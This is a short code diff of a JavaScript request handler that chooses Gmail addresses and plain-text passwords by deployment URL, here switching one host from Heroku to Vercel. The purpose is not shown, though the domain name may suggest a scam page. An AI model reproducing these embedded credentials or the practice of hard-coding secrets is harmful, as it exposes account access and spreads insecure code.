@@ -12,7 +12,7 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim'; 
 
-    } else if(url == 'ubahan-tarif.herokuapp.com'){
+    } else if(url == 'ubahan-tarif.vercel.app'){
         email = 'giozx123456@gmail.com' ;
         pass = 'uzbakbdzoclcyzft' ;
         
